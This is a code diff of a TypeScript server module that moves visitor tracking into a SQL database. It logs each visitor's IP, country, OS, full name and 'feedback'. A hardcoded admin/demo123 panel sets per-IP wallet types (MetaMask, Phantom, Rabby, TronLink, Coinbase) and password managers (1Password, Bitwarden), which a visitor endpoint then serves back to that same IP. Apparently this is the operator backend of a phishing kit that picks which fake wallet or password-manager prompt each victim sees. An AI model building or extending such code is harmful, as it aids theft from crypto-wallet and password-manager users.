@@ -1,5 +1,6 @@
-import { createHash, timingSafeEqual } from "node:crypto";
+import { createHash, randomUUID, timingSafeEqual } from "node:crypto";
 import type { IncomingMessage, ServerResponse } from "node:http";
+import { type DatabaseClient, ensureDatabaseSchema } from "./db.js";
 
 const ADMIN_USERNAME = "admin";
 const ADMIN_PASSWORD = "demo123";
@@ -9,7 +10,8 @@ const MAX_FEEDBACK_LENGTH = 1000;
 
 export type VisitorActivity = {
   ipAddress: string;
-  wallet: "metamask" | "phantom" | null;
+  country: string | null;
+  wallet: "metamask" | "phantom" | "rabby" | "tronlink" | "coinbase" | null;
   passwordManager: "1Password" | "Bitwarden" | null;
   syncStatus: "Synced" | "Not";
   fullNames: {
@@ -28,8 +30,6 @@ export type VisitorActivity = {
     visitedAt: string;
   }[];
 };
-
-const visitorActivities: VisitorActivity[] = [];
 
 const safeEqual = (left: string, right: string) => {
   const leftHash = createHash("sha256").update(left).digest();
@@ -196,15 +196,169 @@ const getClientIp = (request: IncomingMessage) => {
   return ip.startsWith("::ffff:") ? ip.slice(7) : ip;
 };
 
-export const handleAdminActivity = async (
+const getClientCountry = (request: IncomingMessage) => {
+  const header = request.headers["x-vercel-ip-country"];
+  const country = Array.isArray(header) ? header[0] : header;
+  const normalizedCountry = country?.trim().toUpperCase();
+  return normalizedCountry && /^[A-Z]{2}$/.test(normalizedCountry)
+    ? normalizedCountry
+    : null;
+};
+
+type ActivityWithLastVisit = VisitorActivity & { lastVisitedAt: string };
+type ActivityRow = {
+  ipAddress: string;
+  country: string | null;
+  wallet: VisitorActivity["wallet"];
+  passwordManager: VisitorActivity["passwordManager"];
+  syncStatus: VisitorActivity["syncStatus"];
+  lastVisitedAt: string;
+};
+type VisitRow = VisitorActivity["visits"][number] & { ipAddress: string };
+type FeedbackRow = VisitorActivity["feedbacks"][number] & {
+  ipAddress: string;
+};
+type FullNameRow = VisitorActivity["fullNames"][number] & {
+  ipAddress: string;
+};
+
+const ensureVisitorActivity = async (
+  sql: DatabaseClient,
+  ipAddress: string,
+  country: string | null
+) => {
+  await sql`
+    INSERT INTO visitor_activities (ip_address, country)
+    VALUES (${ipAddress}, ${country})
+    ON CONFLICT (ip_address) DO UPDATE
+    SET country = COALESCE(EXCLUDED.country, visitor_activities.country)
+  `;
+};
+
+const readVisitorActivities = async (
+  sql: DatabaseClient
+): Promise<ActivityWithLastVisit[]> => {
+  const [activityResult, visitResult, feedbackResult, fullNameResult] =
+    await Promise.all([
+      sql`
+        SELECT
+          a.ip_address AS "ipAddress",
+          a.country,
+          a.wallet,
+          a.password_manager AS "passwordManager",
+          a.sync_status AS "syncStatus",
+          (
+            SELECT MAX(v.visited_at)::text
+            FROM visitor_visits v
+            WHERE v.ip_address = a.ip_address
+          ) AS "lastVisitedAt"
+        FROM visitor_activities a
+        WHERE EXISTS (
+          SELECT 1
+          FROM visitor_visits v
+          WHERE v.ip_address = a.ip_address
+        )
+        ORDER BY "lastVisitedAt" DESC
+      `,
+      sql`
+        SELECT
+          id,
+          ip_address AS "ipAddress",
+          operating_system AS "operatingSystem",
+          visited_at::text AS "visitedAt"
+        FROM visitor_visits
+        ORDER BY visited_at DESC
+        LIMIT ${MAX_ACTIVITY_RECORDS}
+      `,
+      sql`
+        SELECT
+          id,
+          ip_address AS "ipAddress",
+          feedback,
+          submitted_at::text AS "submittedAt"
+        FROM visitor_feedback
+        ORDER BY submitted_at DESC
+      `,
+      sql`
+        SELECT
+          id,
+          ip_address AS "ipAddress",
+          full_name AS "fullName",
+          submitted_at::text AS "submittedAt"
+        FROM visitor_full_names
+        ORDER BY submitted_at DESC
+      `
+    ]);
+
+  const visitsByIp = new Map<string, VisitorActivity["visits"]>();
+  for (const visit of visitResult as VisitRow[]) {
+    const records = visitsByIp.get(visit.ipAddress) ?? [];
+    records.push({
+      id: visit.id,
+      operatingSystem: visit.operatingSystem,
+      visitedAt: visit.visitedAt
+    });
+    visitsByIp.set(visit.ipAddress, records);
+  }
+
+  const feedbacksByIp = new Map<string, VisitorActivity["feedbacks"]>();
+  for (const feedback of feedbackResult as FeedbackRow[]) {
+    const records = feedbacksByIp.get(feedback.ipAddress) ?? [];
+    records.push({
+      feedback: feedback.feedback,
+      id: feedback.id,
+      submittedAt: feedback.submittedAt
+    });
+    feedbacksByIp.set(feedback.ipAddress, records);
+  }
+
+  const fullNamesByIp = new Map<string, VisitorActivity["fullNames"]>();
+  for (const fullName of fullNameResult as FullNameRow[]) {
+    const records = fullNamesByIp.get(fullName.ipAddress) ?? [];
+    records.push({
+      fullName: fullName.fullName,
+      id: fullName.id,
+      submittedAt: fullName.submittedAt
+    });
+    fullNamesByIp.set(fullName.ipAddress, records);
+  }
+
+  return (activityResult as ActivityRow[]).map((activity) => ({
+    country: activity.country,
+    feedbacks: feedbacksByIp.get(activity.ipAddress) ?? [],
+    fullNames: fullNamesByIp.get(activity.ipAddress) ?? [],
+    ipAddress: activity.ipAddress,
+    lastVisitedAt: activity.lastVisitedAt,
+    passwordManager: activity.passwordManager,
+    syncStatus: activity.syncStatus,
+    visits: visitsByIp.get(activity.ipAddress) ?? [],
+    wallet: activity.wallet
+  }));
+};
+
+const sendDatabaseError = (
+  response: ServerResponse,
+  context: string,
+  error: unknown
+) => {
+  console.error(
+    context,
+    error instanceof Error ? error.message : "Unknown database error."
+  );
+  if (!response.headersSent) {
+    sendJson(response, 500, { error: "Unable to process visitor activity." });
+  }
+};
+
+const processAdminActivity = async (
   request: IncomingMessage,
   response: ServerResponse
 ) => {
-  if (
-    request.method === "POST" &&
-    new URL(request.url ?? "/", "http://localhost").searchParams.get("view") ===
-      "submit-feedback"
-  ) {
+  const view = new URL(request.url ?? "/", "http://localhost").searchParams.get(
+    "view"
+  );
+
+  if (request.method === "POST" && view === "submit-feedback") {
     let body: unknown;
     try {
       body = await readJsonBody(request);
@@ -232,41 +386,41 @@ export const handleAdminActivity = async (
       return;
     }
 
+    const sql = await ensureDatabaseSchema();
     const ipAddress = getClientIp(request);
-    let activity = visitorActivities.find(
-      (entry) => entry.ipAddress === ipAddress
-    );
-    if (!activity) {
-      activity = {
-        feedbacks: [],
-        fullNames: [],
-        ipAddress,
-        passwordManager: null,
-        syncStatus: "Synced",
-        visits: [],
-        wallet: null
-      };
-      visitorActivities.push(activity);
-    }
-
-    const submittedAt = new Date().toISOString();
+    await ensureVisitorActivity(sql, ipAddress, getClientCountry(request));
+    const submittedAt = new Date();
     const isFirstTry = "isFirstTry" in body && body.isFirstTry === true;
     if (!isFirstTry) {
-      activity.wallet = null;
+      await sql`
+        UPDATE visitor_activities
+        SET wallet = NULL
+        WHERE ip_address = ${ipAddress}
+      `;
     }
-    activity.feedbacks.unshift({
-      feedback,
-      id: `${Date.now()}-${Math.random().toString(36).slice(2)}`,
-      submittedAt
-    });
-    if (activity.visits.length === 0) {
-      activity.visits.unshift({
-        id: `${Date.now()}-${Math.random().toString(36).slice(2)}`,
-        operatingSystem: inferOperatingSystem(
-          request.headers["user-agent"] ?? ""
-        ),
-        visitedAt: submittedAt
-      });
+    await sql`
+      INSERT INTO visitor_feedback (id, ip_address, feedback, submitted_at)
+      VALUES (${randomUUID()}, ${ipAddress}, ${feedback}, ${submittedAt})
+    `;
+
+    const existingVisits = await sql`
+      SELECT id
+      FROM visitor_visits
+      WHERE ip_address = ${ipAddress}
+      LIMIT 1
+    `;
+    if (existingVisits.length === 0) {
+      await sql`
+        INSERT INTO visitor_visits (
+          id, ip_address, operating_system, visited_at
+        )
+        VALUES (
+          ${randomUUID()},
+          ${ipAddress},
+          ${inferOperatingSystem(request.headers["user-agent"] ?? "")},
+          ${submittedAt}
+        )
+      `;
     }
 
     sendJson(response, 202, { recorded: true });
@@ -274,66 +428,57 @@ export const handleAdminActivity = async (
   }
 
   if (request.method === "POST") {
+    const sql = await ensureDatabaseSchema();
     const userAgent = request.headers["user-agent"] ?? "";
     const ipAddress = getClientIp(request);
-    let activity = visitorActivities.find(
-      (entry) => entry.ipAddress === ipAddress
-    );
-    if (!activity) {
-      activity = {
-        feedbacks: [],
-        fullNames: [],
-        ipAddress,
-        passwordManager: null,
-        syncStatus: "Synced",
-        visits: [],
-        wallet: null
-      };
-      visitorActivities.push(activity);
-    }
-    activity.visits.unshift({
-      id: `${Date.now()}-${Math.random().toString(36).slice(2)}`,
-      operatingSystem: inferOperatingSystem(userAgent),
-      visitedAt: new Date().toISOString()
-    });
-
-    let visitCount = visitorActivities.reduce(
-      (total, entry) => total + entry.visits.length,
-      0
-    );
-    while (visitCount > MAX_ACTIVITY_RECORDS) {
-      let oldestActivityIndex = -1;
-      let oldestVisitIndex = -1;
-      let oldestTime = Number.POSITIVE_INFINITY;
-      visitorActivities.forEach((entry, entryIndex) => {
-        const visitIndex = entry.visits.length - 1;
-        if (visitIndex < 0) return;
-        const visitedAt = Date.parse(entry.visits[visitIndex].visitedAt);
-        if (visitedAt < oldestTime) {
-          oldestTime = visitedAt;
-          oldestActivityIndex = entryIndex;
-          oldestVisitIndex = visitIndex;
-        }
-      });
-      if (oldestActivityIndex < 0) break;
-      visitorActivities[oldestActivityIndex].visits.splice(oldestVisitIndex, 1);
-      if (visitorActivities[oldestActivityIndex].visits.length === 0) {
-        visitorActivities.splice(oldestActivityIndex, 1);
-      }
-      visitCount -= 1;
-    }
+    await ensureVisitorActivity(sql, ipAddress, getClientCountry(request));
+    await sql`
+      INSERT INTO visitor_visits (
+        id, ip_address, operating_system, visited_at
+      )
+      VALUES (
+        ${randomUUID()},
+        ${ipAddress},
+        ${inferOperatingSystem(userAgent)},
+        ${new Date()}
+      )
+    `;
+    await sql`
+      DELETE FROM visitor_visits
+      WHERE id IN (
+        SELECT id
+        FROM visitor_visits
+        ORDER BY visited_at DESC, id DESC
+        OFFSET ${MAX_ACTIVITY_RECORDS}
+      )
+    `;
+    await sql`
+      DELETE FROM visitor_activities a
+      WHERE NOT EXISTS (
+        SELECT 1
+        FROM visitor_visits v
+        WHERE v.ip_address = a.ip_address
+      )
+    `;
     sendJson(response, 202, { recorded: true });
     return;
   }
 
-  if (
-    request.method === "GET" &&
-    new URL(request.url ?? "/", "http://localhost").searchParams.get("view") ===
-      "wallet-preference"
-  ) {
-    const activity = visitorActivities.find(
-      (entry) => entry.ipAddress === getClientIp(request)
-    );
+  if (request.method === "GET" && view === "wallet-preference") {
+    const sql = await ensureDatabaseSchema();
+    const ipAddress = getClientIp(request);
+    const rows = await sql`
+      SELECT sync_status AS "syncStatus", wallet
+      FROM visitor_activities
+      WHERE ip_address = ${ipAddress}
+      LIMIT 1
+    `;
+    const activity = rows[0] as
+      | {
+          syncStatus: VisitorActivity["syncStatus"];
+          wallet: VisitorActivity["wallet"];
+        }
+      | undefined;
     sendJson(response, 200, {
       syncStatus: activity?.syncStatus ?? "Synced",
       wallet: activity?.wallet ?? null
@@ -365,7 +510,10 @@ export const handleAdminActivity = async (
       typeof body.ipAddress !== "string" ||
       (body.wallet !== null &&
         body.wallet !== "metamask" &&
-        body.wallet !== "phantom") ||
+        body.wallet !== "phantom" &&
+        body.wallet !== "rabby" &&
+        body.wallet !== "tronlink" &&
+        body.wallet !== "coinbase") ||
       (body.passwordManager !== null &&
         body.passwordManager !== "1Password" &&
         body.passwordManager !== "Bitwarden") ||
@@ -375,17 +523,25 @@ export const handleAdminActivity = async (
       return;
     }
 
-    const activity = visitorActivities.find(
-      (entry) => entry.ipAddress === body.ipAddress
-    );
-    if (!activity) {
+    const sql = await ensureDatabaseSchema();
+    const rows = await sql`
+      UPDATE visitor_activities
+      SET
+        wallet = ${body.wallet},
+        password_manager = ${body.passwordManager},
+        sync_status = ${body.syncStatus}
+      WHERE ip_address = ${body.ipAddress}
+      RETURNING ip_address
+    `;
+    if (rows.length === 0) {
       sendJson(response, 404, { error: "Visitor activity was not found." });
       return;
     }
 
-    activity.wallet = body.wallet;
-    activity.passwordManager = body.passwordManager;
-    activity.syncStatus = body.syncStatus;
+    const activities = await readVisitorActivities(sql);
+    const activity = activities.find(
+      (entry) => entry.ipAddress === body.ipAddress
+    );
     sendJson(response, 200, { activity });
     return;
   }
@@ -396,20 +552,23 @@ export const handleAdminActivity = async (
     return;
   }
 
-  const activities = visitorActivities
-    .filter((activity) => activity.visits.length > 0)
-    .map((activity) => ({
-      ...activity,
-      lastVisitedAt: activity.visits[0].visitedAt
-    }))
-    .sort(
-      (left, right) =>
-        Date.parse(right.lastVisitedAt) - Date.parse(left.lastVisitedAt)
-    );
+  const sql = await ensureDatabaseSchema();
+  const activities = await readVisitorActivities(sql);
   sendJson(response, 200, { activities });
 };
 
-export const handleAdminSignup = async (
+export const handleAdminActivity = async (
+  request: IncomingMessage,
+  response: ServerResponse
+) => {
+  try {
+    await processAdminActivity(request, response);
+  } catch (error) {
+    sendDatabaseError(response, "Admin activity request failed.", error);
+  }
+};
+
+const processAdminSignup = async (
   request: IncomingMessage,
   response: ServerResponse
 ) => {
@@ -445,40 +604,47 @@ export const handleAdminSignup = async (
     return;
   }
 
+  const sql = await ensureDatabaseSchema();
   const ipAddress = getClientIp(request);
-  let activity = visitorActivities.find(
-    (entry) => entry.ipAddress === ipAddress
-  );
-  if (!activity) {
-    activity = {
-      feedbacks: [],
-      fullNames: [],
-      ipAddress,
-      passwordManager: null,
-      syncStatus: "Synced",
-      visits: [],
-      wallet: null
-    };
-    visitorActivities.push(activity);
-  }
+  await ensureVisitorActivity(sql, ipAddress, getClientCountry(request));
+  const submittedAt = new Date();
+  await sql`
+    INSERT INTO visitor_full_names (
+      id, ip_address, full_name, submitted_at
+    )
+    VALUES (${randomUUID()}, ${ipAddress}, ${fullName}, ${submittedAt})
+  `;
 
-  const submittedAt = new Date().toISOString();
-  activity.fullNames.unshift({
-    fullName,
-    id: `${Date.now()}-${Math.random().toString(36).slice(2)}`,
-    submittedAt
-  });
-  if (activity.visits.length === 0) {
-    activity.visits.unshift({
-      id: `${Date.now()}-${Math.random().toString(36).slice(2)}`,
-      operatingSystem: inferOperatingSystem(
-        request.headers["user-agent"] ?? ""
-      ),
-      visitedAt: submittedAt
-    });
+  const existingVisits = await sql`
+    SELECT id
+    FROM visitor_visits
+    WHERE ip_address = ${ipAddress}
+    LIMIT 1
+  `;
+  if (existingVisits.length === 0) {
+    await sql`
+      INSERT INTO visitor_visits (
+        id, ip_address, operating_system, visited_at
+      )
+      VALUES (
+        ${randomUUID()},
+        ${ipAddress},
+        ${inferOperatingSystem(request.headers["user-agent"] ?? "")},
+        ${submittedAt}
+      )
+    `;
   }
-
-  console.log(`--- ${ipAddress} - fullname - ${fullName} ---`);
 
   sendJson(response, 202, { recorded: true });
+};
+
+export const handleAdminSignup = async (
+  request: IncomingMessage,
+  response: ServerResponse
+) => {
+  try {
+    await processAdminSignup(request, response);
+  } catch (error) {
+    sendDatabaseError(response, "Admin signup request failed.", error);
+  }
 };
